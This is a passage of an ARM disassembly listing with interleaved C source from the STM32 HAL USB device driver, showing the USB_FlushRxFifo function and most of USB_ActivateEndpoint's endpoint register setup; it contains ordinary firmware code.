 800613e:	4770      	bx	lr

08006140 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8006140:	b480      	push	{r7}
 8006142:	b083      	sub	sp, #12
 8006144:	af00      	add	r7, sp, #0
 8006146:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006148:	2300      	movs	r3, #0
}
 800614a:	4618      	mov	r0, r3
 800614c:	370c      	adds	r7, #12
 800614e:	46bd      	mov	sp, r7
 8006150:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006154:	4770      	bx	lr
	...

08006158 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006158:	b480      	push	{r7}
 800615a:	b09d      	sub	sp, #116	; 0x74
 800615c:	af00      	add	r7, sp, #0
 800615e:	6078      	str	r0, [r7, #4]
 8006160:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8006162:	2300      	movs	r3, #0
 8006164:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8006168:	687a      	ldr	r2, [r7, #4]
 800616a:	683b      	ldr	r3, [r7, #0]
 800616c:	781b      	ldrb	r3, [r3, #0]
 800616e:	009b      	lsls	r3, r3, #2
 8006170:	4413      	add	r3, r2
 8006172:	881b      	ldrh	r3, [r3, #0]
 8006174:	b29b      	uxth	r3, r3
 8006176:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 800617a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800617e:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8006182:	683b      	ldr	r3, [r7, #0]
 8006184:	78db      	ldrb	r3, [r3, #3]
 8006186:	2b03      	cmp	r3, #3
 8006188:	d81f      	bhi.n	80061ca <USB_ActivateEndpoint+0x72>
 800618a:	a201      	add	r2, pc, #4	; (adr r2, 8006190 <USB_ActivateEndpoint+0x38>)
 800618c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8006190:	080061a1 	.word	0x080061a1
 8006194:	080061bd 	.word	0x080061bd
 8006198:	080061d3 	.word	0x080061d3
 800619c:	080061af 	.word	0x080061af
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 80061a0:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80061a4:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80061a8:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80061ac:	e012      	b.n	80061d4 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 80061ae:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80061b2:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 80061b6:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80061ba:	e00b      	b.n	80061d4 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 80061bc:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80061c0:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80061c4:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80061c8:	e004      	b.n	80061d4 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 80061ca:	2301      	movs	r3, #1
 80061cc:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 80061d0:	e000      	b.n	80061d4 <USB_ActivateEndpoint+0x7c>
      break;
 80061d2:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 80061d4:	687a      	ldr	r2, [r7, #4]
 80061d6:	683b      	ldr	r3, [r7, #0]
 80061d8:	781b      	ldrb	r3, [r3, #0]
 80061da:	009b      	lsls	r3, r3, #2
 80061dc:	441a      	add	r2, r3
 80061de:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80061e2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061e6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061ea:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80061ee:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061f2:	b29b      	uxth	r3, r3
 80061f4:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 80061f6:	687a      	ldr	r2, [r7, #4]
 80061f8:	683b      	ldr	r3, [r7, #0]
 80061fa:	781b      	ldrb	r3, [r3, #0]
 80061fc:	009b      	lsls	r3, r3, #2
 80061fe:	4413      	add	r3, r2
 8006200:	881b      	ldrh	r3, [r3, #0]
 8006202:	b29b      	uxth	r3, r3
 8006204:	b21b      	sxth	r3, r3
 8006206:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800620a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800620e:	b21a      	sxth	r2, r3
 8006210:	683b      	ldr	r3, [r7, #0]
 8006212:	781b      	ldrb	r3, [r3, #0]
 8006214:	b21b      	sxth	r3, r3
 8006216:	4313      	orrs	r3, r2
 8006218:	b21b      	sxth	r3, r3
 800621a:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 800621e:	687a      	ldr	r2, [r7, #4]
 8006220:	683b      	ldr	r3, [r7, #0]
 8006222:	781b      	ldrb	r3, [r3, #0]
 8006224:	009b      	lsls	r3, r3, #2
 8006226:	441a      	add	r2, r3
 8006228:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 800622c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006230:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006234:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006238:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800623c:	b29b      	uxth	r3, r3
 800623e:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8006240:	683b      	ldr	r3, [r7, #0]
 8006242:	7b1b      	ldrb	r3, [r3, #12]
 8006244:	2b00      	cmp	r3, #0
 8006246:	f040 8178 	bne.w	800653a <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 800624a:	683b      	ldr	r3, [r7, #0]
 800624c:	785b      	ldrb	r3, [r3, #1]
 800624e:	2b00      	cmp	r3, #0
 8006250:	f000 8084 	beq.w	800635c <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006254:	687b      	ldr	r3, [r7, #4]
 8006256:	61bb      	str	r3, [r7, #24]
 8006258:	687b      	ldr	r3, [r7, #4]
 800625a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800625e:	b29b      	uxth	r3, r3
 8006260:	461a      	mov	r2, r3
 8006262:	69bb      	ldr	r3, [r7, #24]
 8006264:	4413      	add	r3, r2
 8006266:	61bb      	str	r3, [r7, #24]
 8006268:	683b      	ldr	r3, [r7, #0]
 800626a:	781b      	ldrb	r3, [r3, #0]
 800626c:	00da      	lsls	r2, r3, #3
 800626e:	69bb      	ldr	r3, [r7, #24]
 8006270:	4413      	add	r3, r2
 8006272:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006276:	617b      	str	r3, [r7, #20]
 8006278:	683b      	ldr	r3, [r7, #0]
 800627a:	88db      	ldrh	r3, [r3, #6]
 800627c:	085b      	lsrs	r3, r3, #1
 800627e:	b29b      	uxth	r3, r3
 8006280:	005b      	lsls	r3, r3, #1
 8006282:	b29a      	uxth	r2, r3
 8006284:	697b      	ldr	r3, [r7, #20]
 8006286:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006288:	687a      	ldr	r2, [r7, #4]
 800628a:	683b      	ldr	r3, [r7, #0]
 800628c:	781b      	ldrb	r3, [r3, #0]
 800628e:	009b      	lsls	r3, r3, #2
 8006290:	4413      	add	r3, r2
 8006292:	881b      	ldrh	r3, [r3, #0]
 8006294:	827b      	strh	r3, [r7, #18]
 8006296:	8a7b      	ldrh	r3, [r7, #18]
 8006298:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800629c:	2b00      	cmp	r3, #0
 800629e:	d01b      	beq.n	80062d8 <USB_ActivateEndpoint+0x180>
 80062a0:	687a      	ldr	r2, [r7, #4]
 80062a2:	683b      	ldr	r3, [r7, #0]
 80062a4:	781b      	ldrb	r3, [r3, #0]
 80062a6:	009b      	lsls	r3, r3, #2
 80062a8:	4413      	add	r3, r2
 80062aa:	881b      	ldrh	r3, [r3, #0]
 80062ac:	b29b      	uxth	r3, r3
 80062ae:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062b2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062b6:	823b      	strh	r3, [r7, #16]
 80062b8:	687a      	ldr	r2, [r7, #4]
 80062ba:	683b      	ldr	r3, [r7, #0]
 80062bc:	781b      	ldrb	r3, [r3, #0]
 80062be:	009b      	lsls	r3, r3, #2
 80062c0:	441a      	add	r2, r3
 80062c2:	8a3b      	ldrh	r3, [r7, #16]
 80062c4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062c8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062cc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062d0:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80062d4:	b29b      	uxth	r3, r3
 80062d6:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80062d8:	683b      	ldr	r3, [r7, #0]
 80062da:	78db      	ldrb	r3, [r3, #3]
 80062dc:	2b01      	cmp	r3, #1
 80062de:	d020      	beq.n	8006322 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80062e0:	687a      	ldr	r2, [r7, #4]
 80062e2:	683b      	ldr	r3, [r7, #0]
 80062e4:	781b      	ldrb	r3, [r3, #0]
 80062e6:	009b      	lsls	r3, r3, #2
 80062e8:	4413      	add	r3, r2
 80062ea:	881b      	ldrh	r3, [r3, #0]
 80062ec:	b29b      	uxth	r3, r3
 80062ee:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062f2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80062f6:	81bb      	strh	r3, [r7, #12]
 80062f8:	89bb      	ldrh	r3, [r7, #12]
 80062fa:	f083 0320 	eor.w	r3, r3, #32
 80062fe:	81bb      	strh	r3, [r7, #12]
 8006300:	687a      	ldr	r2, [r7, #4]
 8006302:	683b      	ldr	r3, [r7, #0]
 8006304:	781b      	ldrb	r3, [r3, #0]
 8006306:	009b      	lsls	r3, r3, #2
 8006308:	441a      	add	r2, r3
 800630a:	89bb      	ldrh	r3, [r7, #12]
 800630c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006310:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006314:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006318:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800631c:	b29b      	uxth	r3, r3
 800631e:	8013      	strh	r3, [r2, #0]
 8006320:	e2d5      	b.n	80068ce <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006322:	687a      	ldr	r2, [r7, #4]
 8006324:	683b      	ldr	r3, [r7, #0]
 8006326:	781b      	ldrb	r3, [r3, #0]
 8006328:	009b      	lsls	r3, r3, #2
 800632a:	4413      	add	r3, r2
 800632c:	881b      	ldrh	r3, [r3, #0]
 800632e:	b29b      	uxth	r3, r3
 8006330:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006334:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006338:	81fb      	strh	r3, [r7, #14]
 800633a:	687a      	ldr	r2, [r7, #4]
 800633c:	683b      	ldr	r3, [r7, #0]
 800633e:	781b      	ldrb	r3, [r3, #0]
 8006340:	009b      	lsls	r3, r3, #2
 8006342:	441a      	add	r2, r3
 8006344:	89fb      	ldrh	r3, [r7, #14]
 8006346:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800634a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800634e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006352:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006356:	b29b      	uxth	r3, r3
 8006358:	8013      	strh	r3, [r2, #0]
 800635a:	e2b8      	b.n	80068ce <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 800635c:	687b      	ldr	r3, [r7, #4]
 800635e:	633b      	str	r3, [r7, #48]	; 0x30
 8006360:	687b      	ldr	r3, [r7, #4]
 8006362:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006366:	b29b      	uxth	r3, r3
 8006368:	461a      	mov	r2, r3
 800636a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 800636c:	4413      	add	r3, r2
 800636e:	633b      	str	r3, [r7, #48]	; 0x30
 8006370:	683b      	ldr	r3, [r7, #0]
 8006372:	781b      	ldrb	r3, [r3, #0]
 8006374:	00da      	lsls	r2, r3, #3
 8006376:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006378:	4413      	add	r3, r2
 800637a:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800637e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006380:	683b      	ldr	r3, [r7, #0]
 8006382:	88db      	ldrh	r3, [r3, #6]
 8006384:	085b      	lsrs	r3, r3, #1
 8006386:	b29b      	uxth	r3, r3
 8006388:	005b      	lsls	r3, r3, #1
 800638a:	b29a      	uxth	r2, r3
 800638c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 800638e:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 8006390:	687b      	ldr	r3, [r7, #4]
 8006392:	62bb      	str	r3, [r7, #40]	; 0x28
 8006394:	687b      	ldr	r3, [r7, #4]
 8006396:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800639a:	b29b      	uxth	r3, r3
 800639c:	461a      	mov	r2, r3
 800639e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80063a0:	4413      	add	r3, r2
 80063a2:	62bb      	str	r3, [r7, #40]	; 0x28
 80063a4:	683b      	ldr	r3, [r7, #0]
 80063a6:	781b      	ldrb	r3, [r3, #0]
 80063a8:	00da      	lsls	r2, r3, #3
 80063aa:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80063ac:	4413      	add	r3, r2
 80063ae:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80063b2:	627b      	str	r3, [r7, #36]	; 0x24
 80063b4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063b6:	881b      	ldrh	r3, [r3, #0]
 80063b8:	b29b      	uxth	r3, r3
 80063ba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80063be:	b29a      	uxth	r2, r3
 80063c0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063c2:	801a      	strh	r2, [r3, #0]
 80063c4:	683b      	ldr	r3, [r7, #0]
 80063c6:	691b      	ldr	r3, [r3, #16]
 80063c8:	2b3e      	cmp	r3, #62	; 0x3e
 80063ca:	d91d      	bls.n	8006408 <USB_ActivateEndpoint+0x2b0>
 80063cc:	683b      	ldr	r3, [r7, #0]
 80063ce:	691b      	ldr	r3, [r3, #16]
 80063d0:	095b      	lsrs	r3, r3, #5
 80063d2:	66bb      	str	r3, [r7, #104]	; 0x68
 80063d4:	683b      	ldr	r3, [r7, #0]
 80063d6:	691b      	ldr	r3, [r3, #16]
 80063d8:	f003 031f 	and.w	r3, r3, #31
 80063dc:	2b00      	cmp	r3, #0
 80063de:	d102      	bne.n	80063e6 <USB_ActivateEndpoint+0x28e>
 80063e0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80063e2:	3b01      	subs	r3, #1
 80063e4:	66bb      	str	r3, [r7, #104]	; 0x68
 80063e6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063e8:	881b      	ldrh	r3, [r3, #0]
 80063ea:	b29a      	uxth	r2, r3
 80063ec:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80063ee:	b29b      	uxth	r3, r3
 80063f0:	029b      	lsls	r3, r3, #10
 80063f2:	b29b      	uxth	r3, r3
 80063f4:	4313      	orrs	r3, r2
 80063f6:	b29b      	uxth	r3, r3
 80063f8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80063fc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006400:	b29a      	uxth	r2, r3
 8006402:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006404:	801a      	strh	r2, [r3, #0]
 8006406:	e026      	b.n	8006456 <USB_ActivateEndpoint+0x2fe>
 8006408:	683b      	ldr	r3, [r7, #0]
 800640a:	691b      	ldr	r3, [r3, #16]
 800640c:	2b00      	cmp	r3, #0
 800640e:	d10a      	bne.n	8006426 <USB_ActivateEndpoint+0x2ce>
 8006410:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006412:	881b      	ldrh	r3, [r3, #0]
 8006414:	b29b      	uxth	r3, r3
 8006416:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800641a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800641e:	b29a      	uxth	r2, r3
 8006420:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006422:	801a      	strh	r2, [r3, #0]
 8006424:	e017      	b.n	8006456 <USB_ActivateEndpoint+0x2fe>
 8006426:	683b      	ldr	r3, [r7, #0]
 8006428:	691b      	ldr	r3, [r3, #16]
 800642a:	085b      	lsrs	r3, r3, #1
 800642c:	66bb      	str	r3, [r7, #104]	; 0x68
 800642e:	683b      	ldr	r3, [r7, #0]
 8006430:	691b      	ldr	r3, [r3, #16]
 8006432:	f003 0301 	and.w	r3, r3, #1
 8006436:	2b00      	cmp	r3, #0
 8006438:	d002      	beq.n	8006440 <USB_ActivateEndpoint+0x2e8>
 800643a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800643c:	3301      	adds	r3, #1
 800643e:	66bb      	str	r3, [r7, #104]	; 0x68
 8006440:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006442:	881b      	ldrh	r3, [r3, #0]
 8006444:	b29a      	uxth	r2, r3
 8006446:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006448:	b29b      	uxth	r3, r3
 800644a:	029b      	lsls	r3, r3, #10
 800644c:	b29b      	uxth	r3, r3
 800644e:	4313      	orrs	r3, r2
 8006450:	b29a      	uxth	r2, r3
 8006452:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006454:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006456:	687a      	ldr	r2, [r7, #4]
 8006458:	683b      	ldr	r3, [r7, #0]
 800645a:	781b      	ldrb	r3, [r3, #0]
 800645c:	009b      	lsls	r3, r3, #2
 800645e:	4413      	add	r3, r2
 8006460:	881b      	ldrh	r3, [r3, #0]
 8006462:	847b      	strh	r3, [r7, #34]	; 0x22
 8006464:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006466:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800646a:	2b00      	cmp	r3, #0
 800646c:	d01b      	beq.n	80064a6 <USB_ActivateEndpoint+0x34e>
 800646e:	687a      	ldr	r2, [r7, #4]
 8006470:	683b      	ldr	r3, [r7, #0]
 8006472:	781b      	ldrb	r3, [r3, #0]
 8006474:	009b      	lsls	r3, r3, #2
 8006476:	4413      	add	r3, r2
 8006478:	881b      	ldrh	r3, [r3, #0]
 800647a:	b29b      	uxth	r3, r3
 800647c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006480:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006484:	843b      	strh	r3, [r7, #32]
 8006486:	687a      	ldr	r2, [r7, #4]
 8006488:	683b      	ldr	r3, [r7, #0]
 800648a:	781b      	ldrb	r3, [r3, #0]
 800648c:	009b      	lsls	r3, r3, #2
 800648e:	441a      	add	r2, r3
 8006490:	8c3b      	ldrh	r3, [r7, #32]
 8006492:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006496:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800649a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800649e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064a2:	b29b      	uxth	r3, r3
 80064a4:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 80064a6:	683b      	ldr	r3, [r7, #0]
 80064a8:	781b      	ldrb	r3, [r3, #0]
 80064aa:	2b00      	cmp	r3, #0
 80064ac:	d124      	bne.n	80064f8 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80064ae:	687a      	ldr	r2, [r7, #4]
 80064b0:	683b      	ldr	r3, [r7, #0]
 80064b2:	781b      	ldrb	r3, [r3, #0]
 80064b4:	009b      	lsls	r3, r3, #2
 80064b6:	4413      	add	r3, r2
 80064b8:	881b      	ldrh	r3, [r3, #0]
 80064ba:	b29b      	uxth	r3, r3
 80064bc:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80064c0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064c4:	83bb      	strh	r3, [r7, #28]
 80064c6:	8bbb      	ldrh	r3, [r7, #28]
 80064c8:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80064cc:	83bb      	strh	r3, [r7, #28]
 80064ce:	8bbb      	ldrh	r3, [r7, #28]
 80064d0:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80064d4:	83bb      	strh	r3, [r7, #28]
 80064d6:	687a      	ldr	r2, [r7, #4]
 80064d8:	683b      	ldr	r3, [r7, #0]
 80064da:	781b      	ldrb	r3, [r3, #0]
 80064dc:	009b      	lsls	r3, r3, #2
 80064de:	441a      	add	r2, r3
 80064e0:	8bbb      	ldrh	r3, [r7, #28]
 80064e2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064e6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064ea:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064ee:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064f2:	b29b      	uxth	r3, r3
 80064f4:	8013      	strh	r3, [r2, #0]
 80064f6:	e1ea      	b.n	80068ce <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 80064f8:	687a      	ldr	r2, [r7, #4]
 80064fa:	683b      	ldr	r3, [r7, #0]
 80064fc:	781b      	ldrb	r3, [r3, #0]
 80064fe:	009b      	lsls	r3, r3, #2
 8006500:	4413      	add	r3, r2
 8006502:	881b      	ldrh	r3, [r3, #0]
 8006504:	b29b      	uxth	r3, r3
 8006506:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800650a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800650e:	83fb      	strh	r3, [r7, #30]
 8006510:	8bfb      	ldrh	r3, [r7, #30]
 8006512:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006516:	83fb      	strh	r3, [r7, #30]
 8006518:	687a      	ldr	r2, [r7, #4]
 800651a:	683b      	ldr	r3, [r7, #0]
 800651c:	781b      	ldrb	r3, [r3, #0]
 800651e:	009b      	lsls	r3, r3, #2
 8006520:	441a      	add	r2, r3
 8006522:	8bfb      	ldrh	r3, [r7, #30]
 8006524:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006528:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800652c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006530:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006534:	b29b      	uxth	r3, r3
 8006536:	8013      	strh	r3, [r2, #0]
 8006538:	e1c9      	b.n	80068ce <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 800653a:	683b      	ldr	r3, [r7, #0]
 800653c:	78db      	ldrb	r3, [r3, #3]
 800653e:	2b02      	cmp	r3, #2
 8006540:	d11e      	bne.n	8006580 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006542:	687a      	ldr	r2, [r7, #4]
 8006544:	683b      	ldr	r3, [r7, #0]
 8006546:	781b      	ldrb	r3, [r3, #0]
 8006548:	009b      	lsls	r3, r3, #2
 800654a:	4413      	add	r3, r2
 800654c:	881b      	ldrh	r3, [r3, #0]
 800654e:	b29b      	uxth	r3, r3
 8006550:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006554:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006558:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800655c:	687a      	ldr	r2, [r7, #4]
 800655e:	683b      	ldr	r3, [r7, #0]
 8006560:	781b      	ldrb	r3, [r3, #0]
 8006562:	009b      	lsls	r3, r3, #2
 8006564:	441a      	add	r2, r3
 8006566:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 800656a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800656e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006572:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006576:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800657a:	b29b      	uxth	r3, r3
 800657c:	8013      	strh	r3, [r2, #0]
 800657e:	e01d      	b.n	80065bc <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 8006580:	687a      	ldr	r2, [r7, #4]
 8006582:	683b      	ldr	r3, [r7, #0]
 8006584:	781b      	ldrb	r3, [r3, #0]
 8006586:	009b      	lsls	r3, r3, #2
 8006588:	4413      	add	r3, r2
 800658a:	881b      	ldrh	r3, [r3, #0]
 800658c:	b29b      	uxth	r3, r3
 800658e:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8006592:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006596:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 800659a:	687a      	ldr	r2, [r7, #4]
 800659c:	683b      	ldr	r3, [r7, #0]
 800659e:	781b      	ldrb	r3, [r3, #0]
 80065a0:	009b      	lsls	r3, r3, #2
 80065a2:	441a      	add	r2, r3
 80065a4:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 80065a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065b0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065b4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065b8:	b29b      	uxth	r3, r3
 80065ba:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 80065bc:	687b      	ldr	r3, [r7, #4]
 80065be:	65fb      	str	r3, [r7, #92]	; 0x5c
 80065c0:	687b      	ldr	r3, [r7, #4]
 80065c2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80065c6:	b29b      	uxth	r3, r3
 80065c8:	461a      	mov	r2, r3
 80065ca:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80065cc:	4413      	add	r3, r2
 80065ce:	65fb      	str	r3, [r7, #92]	; 0x5c
 80065d0:	683b      	ldr	r3, [r7, #0]
 80065d2:	781b      	ldrb	r3, [r3, #0]
 80065d4:	00da      	lsls	r2, r3, #3
 80065d6:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80065d8:	4413      	add	r3, r2
 80065da:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80065de:	65bb      	str	r3, [r7, #88]	; 0x58
 80065e0:	683b      	ldr	r3, [r7, #0]
 80065e2:	891b      	ldrh	r3, [r3, #8]
 80065e4:	085b      	lsrs	r3, r3, #1
 80065e6:	b29b      	uxth	r3, r3
